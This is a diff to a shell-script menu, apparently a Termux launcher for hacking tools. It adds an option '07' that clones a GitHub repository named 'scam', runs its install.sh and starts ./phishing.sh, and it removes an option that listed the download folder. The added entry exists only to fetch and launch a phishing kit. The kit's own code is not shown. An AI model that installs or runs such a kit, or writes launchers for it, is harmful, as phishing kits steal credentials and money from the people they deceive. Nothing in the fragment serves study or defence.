@@ -267,6 +267,27 @@ $re"
 
 
 
+
+07)
+cd
+apt update -y
+apt upgrade -y
+pkg install git -y
+git clone https://github.com/Cesar-Hack-Gray/scam
+cd
+cd scam
+bash install.sh
+./phishing.sh
+;;
+
+
+
+
+
+
+
+
+
 99)
 cd
 cd ../usr/etc
@@ -285,10 +306,5 @@ cd ../usr/bin
 rm -Rf said
 rm -Rf said-update
 cd
-;;
-dw) 
-cd
-cd /sdcard/download
-ls
 ;;
 esac
